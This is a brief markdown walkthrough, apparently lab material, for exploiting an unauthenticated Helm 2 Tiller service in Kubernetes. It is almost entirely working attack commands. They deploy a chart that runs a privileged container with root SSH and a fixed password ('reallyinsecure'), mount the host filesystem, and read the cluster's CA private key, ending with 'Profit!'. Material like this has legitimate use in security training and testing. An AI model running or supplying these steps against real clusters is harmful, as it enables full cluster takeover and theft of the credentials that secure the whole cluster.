# Unauthenticated Tiller

1. `helm2 --host [CLUSTERIP]:[NodePort] version` - Will prove we have access when the server replies.
2. `helm2 --host [CLUSTERIP]:[NodePort] ls` - will show there are no charts currently deployed.
3. `helm2 --host [CLUSTERIP]:[NodePort] install /charts/privsshchart-0.1.0.tgz` - Will deploy a chart which runs a privileged container in the cluster and opens SSH with a predictable username/password.  This should deploy the SSH service to a port in the service range.  This pod also mounts the underlying root filesystem under `/host` on the cluster.
4. `ssh -p [PORT] root@[CLUSTERIP]` password is `reallyinsecure`
5. `cat /host/etc/kubernetes/pki/ca.key`
6. Profit!